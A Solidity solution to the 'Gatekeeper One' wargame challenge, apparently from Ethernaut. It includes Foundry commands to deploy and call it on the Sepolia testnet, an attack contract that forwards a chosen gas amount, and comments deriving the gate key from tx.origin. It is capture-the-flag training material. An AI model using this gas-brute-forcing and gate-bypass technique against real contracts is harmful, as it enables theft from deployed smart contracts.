// SPDX-License-Identifier: MIT

/**
 * > forge test --fork-url ${SEPOLIA_RPC_URL} --mt testForkAttack -vv
 * > forge create src/GatekeeperOneHack.sol:GatekeeperOneHack --rpc-url ${SEPOLIA_RPC_URL} --account updraft --broadcast
 * > cast send  --rpc-url ${SEPOLIA_RPC_URL}
 *              --account updraft
 *              --gas-limit 100000
 *              ${GATEKEEPERONE_HACK_ADDRESS}
 *              "hackGatekeeperOne(address,bytes8,uint256)" ${GATEKEEPERONE_INSTANCE_ADDRESS} 0x00000001000085f3 57593
 */

pragma solidity ^0.8.0;

contract GatekeeperOneHack {
    function hackGatekeeperOne(address addressOne, bytes8 gateKey, uint256 gasToForward) external returns (bool) {
        (bool success,) = addressOne.call{gas: gasToForward}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        return success;
    }
}

/*
        require(msg.sender != tx.origin);

        require(gasleft() % 8191 == 0);

                        0x00 00 00 01 00 00 85 f3
    modifier gateThree(bytes8 _gateKey) {
        //       0x000085f3                            0x85f3
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");


        //         0x000085f3        0x00000001 000085f3
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");


        //          0x000085f3                       0x85f3
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
*/

